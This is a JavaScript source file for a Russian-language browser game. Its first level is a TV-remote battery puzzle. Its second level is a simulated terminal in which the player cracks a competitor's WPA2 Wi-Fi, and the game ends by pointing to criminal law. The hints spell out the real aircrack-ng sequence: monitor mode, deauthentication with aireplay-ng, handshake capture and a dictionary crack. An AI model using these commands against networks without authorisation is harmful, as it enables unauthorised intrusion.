function GameOver() {
    alert("Вы проиграли!");
    window.location = "index.html" // Reload Whole Game
}

function Intro() {
    alert("Добро пожаловать в игру \"ОбычнаяРаботаПрограммиста\".");
    alert("Здесь вам придётся заниматься всем чем угодно кроме непосредственной разработки ПО.");
    alert("Удачи!");
}

function Level1() {
    alert("Дядя Валера: Слушай малец, у меня перестал работать пульт от ТВ можешь посмотреть что с ним?");
    let answer = window.confirm("Помочь Дяде Валере?");
    if (!answer) { GameOver(); }

    document.write("<img class=droppable id=pult src=imgs/Level1/pult.svg style='zIndex: 0; position: absolute; left: 40%'></img>");
    document.write("<img id=battery1 src=imgs/Level1/battery.svg style='zIndex: 2; position: absolute; top: 69.3%; left: 44.1%'</img>");
    document.write("<img id=battery2 src=imgs/Level1/battery.svg style='zIndex: 3; position: absolute; top: 69.3%; left: 47.1%'</img>");
    document.write("<img id=new_battery1 src=imgs/Level1/new_battery.svg style='zIndex: 4; position: absolute; top: 60%; left: 60%'</img>");
    document.write("<img id=new_battery2 src=imgs/Level1/new_battery.svg style='zIndex: 5; position: absolute; top: 60%; left: 65%'</img>");
    document.write("<img id=lid src=imgs/Level1/lid.svg style='zIndex: 1; position: absolute; top: 69.3%; left: 44.1%'</img>");

    let pult = document.getElementById("pult");
    let lid = document.getElementById("lid");
    let battery1 = document.getElementById("battery1");
    let battery2 = document.getElementById("battery2");
    let new_battery1 = document.getElementById("new_battery1");
    let new_battery2 = document.getElementById("new_battery2");

    let state = 0;

    function setDraggable(elem) {
        elem.ondragstart = function () { return false; }

        elem.onmousedown = function (evnt) {
            let currentDroppable = null;

            let shiftX = evnt.pageX - elem.getBoundingClientRect().left;
            let shiftY = evnt.pageY - elem.getBoundingClientRect().top;

            document.body.append(elem);

            MoveAt(evnt.pageX, evnt.pageY);

            function MoveAt(x, y) {
                elem.style.left = x - shiftX + 'px';
                elem.style.top = y - shiftY + 'px';
            }

            function onMouseMove(evnt) {
                MoveAt(evnt.pageX, evnt.pageY);

                elem.hidden = true;
                let elemBelow = document.elementFromPoint(evnt.clientX, evnt.clientY);
                elem.hidden = false;

                if (!elemBelow) return;

                let droppableBelow = elemBelow.closest('.droppable');

                if (currentDroppable != droppableBelow) {
                    function leaveDroppable(elem) { elem.style.background = ''; }
                    if (currentDroppable) leaveDroppable(currentDroppable);

                    currentDroppable = droppableBelow;

                    function enterDroppable(elem) { elem.style.background = 'cyan'; }
                    if (currentDroppable) enterDroppable(currentDroppable);
                }
            }

            document.addEventListener('mousemove', onMouseMove);

            elem.onmouseup = function () {
                if (currentDroppable == pult && elem == new_battery1) { // set new_battery1
                    elem.style.top = '69.3%';
                    elem.style.left = '44.1%';
                    unsetDraggable(new_battery1);
                    ++state;
                }
                else if (currentDroppable == pult && elem == new_battery2) // set new_battery2
                {
                    elem.style.top = '69.3%';
                    elem.style.left = '47.1%';
                    unsetDraggable(new_battery2);
                    ++state;
                }
                else if (currentDroppable == null && elem == battery1) // unset battery1
                {
                    unsetDraggable(battery1);
                    ++state;
                }
                else if (currentDroppable == null && elem == battery2) // unset battery2
                {
                    unsetDraggable(battery2);
                    ++state;
                }
                else if (currentDroppable == pult && elem == lid && state == 4) // set lid
                {
                    lid.style.top = '69.3%';
                    lid.style.left = '44.1%';
                    unsetDraggable(lid);
                    setTimeout(() => {
                        battery1.remove();
                        battery2.remove();
                        lid.remove();
                        new_battery1.remove();
                        new_battery2.remove();
                        pult.remove();
                        setTimeout(()=>
                        {
                            alert("Дядя Валера: Ладно, если всё работает тогда я думаю что всё в порядке.");
                            alert("Успех!");
                        Level2();
                        },333);
                    }, 333);
                }
                document.removeEventListener('mousemove', onMouseMove);
                elem.onmouseup = null;
            };
        };
    }

    function unsetDraggable(elem) {
        elem.ondragstart = function () { };
        elem.onmousedown = function () { elem.onmouseup = function () { }; };
    }

    setDraggable(lid);
    setDraggable(battery1);
    setDraggable(battery2);
    setDraggable(new_battery1);
    setDraggable(new_battery2);
}

function Level2() {
    alert("Дядя Валера: Слушай, я посоветовал тебя одному моему знакомому из крупной фирмы надеюсь ты не оплошаешь");

    let answer = confirm("Александр Викторович: Здравствуйте, у меня возникла работа для вас, Валерий Петрович сказал на вас можно положиться, это так?");

    if(!answer) { GameOver(); }
    
    alert("Отлично, как вы уже знаете я работаю в крупной компании в сфере облачных решений и у нас возникла дилема с которой не может справиться ни один сотрудник нашей компании. "
    +"Может у тебя есть какие нибудь идеи?");

    alert("Понимаешь почему я обратился к тебе? Это дело деликатное. Как мне сообщили сотрудники нам придётся поработать с нелегальшиной, а именно взломом.");

    alert("Тебе предстоит обойти защиту беспроводной сети нашего конкурента.");

    document.write("<img style=\"zIndex:0; background-image:url('imgs/Level2/kali.jpg'); background-repeat: no-repeat; background-attachment: fixed; background-size: cover;"
    +"position:absolute; top:-1; left:-1; width:100%; height:100%\"></img>");

    document.write(
    "<textarea id=term readonly style='zIndex:1; overflow-x:hidden; color:#7fff7f; background-color:black; position:absolute; top:-1; left:-1; height:100%; width:100%; opacity: 90%'>"
    +"</textarea>");

    let term = document.getElementById("term");

    term.value = "[cloudCorp@CalyLunix ~]$> ";

    setTimeout(()=>{ alert("Так нужно посмотреть что за команды у нас есть используя команду help") },500);

    term.focus();

    term.onkeydown = function (e) 
    {
        let keyCode = String.fromCharCode(e.keyCode).toLowerCase();

        if(e.keyCode == 13) // If enter pressed
        {
            let arr = term.value.split('>'); // Split
            let command = arr[arr.length-1].slice(1);

            term.value += '\n';

            // User Defined Text
            if(command == "help")
            {
                term.value += "help\tifconfig\nairmon-ng\tairodump-ng\naireplay-ng\taircrack-ng\n";
                setTimeout(()=>{ alert("Отлично! Используем команду ifconfig для просмотра всех интерфейсов")},500);
            }
            else if(command == "ifconfig")
            {
                term.value +=
                " eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"+
                    "\tinet 10.12.42.77  netmask 255.255.255.0  broadcast 10.12.42.77\n"+
                    "\tinet6 d8g0::1d2f:65e5:4abd:e4d6  prefixlen 64  scopeid 0x20<link>\n"+
                    "\tether 94:de:80:bc:93:69  txqueuelen 1000  (Ethernet)\n"+
                    "\tRX packets 1066734  bytes 1202023946 (1.1 GiB)\n"+
                    "\tRX errors 0  dropped 0  overruns 0  frame 0\n"+
                    "\tTX packets 668878  bytes 74269419 (70.8 MiB)\n"+
                    "\tTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"+
                    "\tdevice interrupt 33  base 0x9000\n\n"+
            
                " lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n"+
                    "\tinet 127.0.0.1  netmask 255.0.0.0\n"+
                    "\tinet6 ::1  prefixlen 128  scopeid 0x10<host>\n"+
                    "\tloop  txqueuelen 1000  (Local Loopback)\n"+
                    "\tRX packets 520  bytes 1275006 (1.2 MiB)\n"+
                    "\tRX errors 0  dropped 0  overruns 0  frame 0\n"+
                    "\tTX packets 520  bytes 1275006 (1.2 MiB)\n"+
                    "\tTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n"+
                
                " wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500\n"+
                    "\tether f9:17:d5:e5:eb:c0  txqueuelen 1000  (Ethernet)\n"+
                    "\tRX packets 0  bytes 0 (0.0 B)\n"+
                    "\tRX errors 0  dropped 0  overruns 0  frame 0\n"+
                    "\tTX packets 0  bytes 0 (0.0 B)\n"+
                    "\tTX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n";
                    setTimeout(()=>{ alert("Хорошо, теперь нам нужно убрать лишние процессы использующие wifi командой airmon-ng check kill")},500);
            }
            else if(command == "airmon-ng") 
            {
                term.value += 

                " USING:\n"+
                    "\tairmon-ng check kill\n"+
                    "\tairmon-ng start wlan0\n"
            }
            else if(command == "airmon-ng check kill")
            {
                term.value +=

                "\nKilling these processes:\n\n"+
                "   PID\tNAME\n"+
                "   420\twpa_supplicant\n"
                setTimeout(()=>{ alert("Так . . . Есть! Перевожу интерфейс wlan0 в режим монитора командой airmon-ng start wlan0")},500);
            }
            else if(command == "airmon-ng start wlan0")
            {
                term.value +=

                " PHY Interface   Driver      Chipset\n\n"+
 
                " phy0    wlan0       iwlwifi     Intel Corporation Centrino Advanced-N 6235 (rev 24)\n"+
                        "\t(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)\n"+
                        "\t(mac80211 station mode vif disabled for [phy0]wlan0)\n";
                setTimeout(()=>{ alert("Готово. Посмотрим на сети цели командой airodump-ng wlan0mon")},500);
            }
            else if(command == "airodump-ng") 
            {
                term.value += "airodump-ng wlan0mon";
                term.value += "airodump-ng -c 1 --bssid 80:35:c1:13:c1:2c -w /root wlan0mon";
            }
            else if(command == "airodump-ng wlan0mon")
            {
                term.value +=

                " BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n"+

                " 80:35:c1:13:c1:2c  -46        2        0    0   1  130  WPA2 CCMP   MGT  TWCWiFi-Passpoint\n"
                setTimeout(()=>{ alert("Ага, теперь отрубаем его от сетки для захвата пакета подключения командой aireplay-ng -0 10 -a 80:35:c1:13:c1:2c wlan0mon")},500);
            }
            else if(command == "airodump-ng -c 1 --bssid 80:35:c1:13:c1:2c -w /root wlan0mon") {}
            else if(command == "aireplay-ng") 
            {
                term.value += "aireplay-ng -0 10 -a 80:35:c1:13:c1:2c wlan0mon";
            }
            else if(command == "aireplay-ng -0 10 -a 80:35:c1:13:c1:2c wlan0mon")
            {
                setTimeout(()=>{ alert("Подключился, а теперь нужно взломать пароль командой aircrack-ng -a2 -b 80:35:c1:13:c1:2c -w /root/passwords.txt /root/hacking-01.cap")},500);
            }
            else if(command == "aircrack") 
            {
                term.value += "aircrack-ng -a2 -b 80:35:c1:13:c1:2c -w /root/passwords.txt /root/hacking-01.cap";
            }
            else if(command == "aircrack-ng -a2 -b 80:35:c1:13:c1:2c -w /root/passwords.txt /root/hacking-01.cap")
            {
                term.value += "\n\tKey Found! K1ttyL0ver1337";
                setTimeout(()=>
                {
                    alert("Работа завершена!")
                    alert("Александр Викторович: Отличная работа паренёк! Далеко пойдёшь! "
                    +"Только ты не учёл того что нужно подбирать хороших знакомых, ведь Валерий Петрович сдал вас за хорошую сумму денег и вы поедете далеко и надолго.")
                    alert("GAME IS OVER!")
                    document.location = "http://www.consultant.ru/document/cons_doc_LAW_10699/5c337673c261a026c476d578035ce68a0ae86da0/";
                },500);
            }
            else if(command == ""){}
            else
            {
                term.value += `${command} Not Found!`
            }

            term.value += "\n[cloudCorp@CalyLunix ~]$> ";
        }
        else if(e.keyCode == 8 && term.value.length > 26)
        {
            term.value = term.value.slice(0,-1);
        }
        else if(e.keyCode == 189) { term.value += '-'; }
        else if(e.keyCode == 186)  { term.value += ':'; }
        else if(e.keyCode == 191)  { term.value += '/'; }
        else if(e.keyCode == 190)  { term.value += '.'; }
        else if(e.keyCode > 21)
        {
            term.value += keyCode;
        }
    };
}

Intro();

Level1();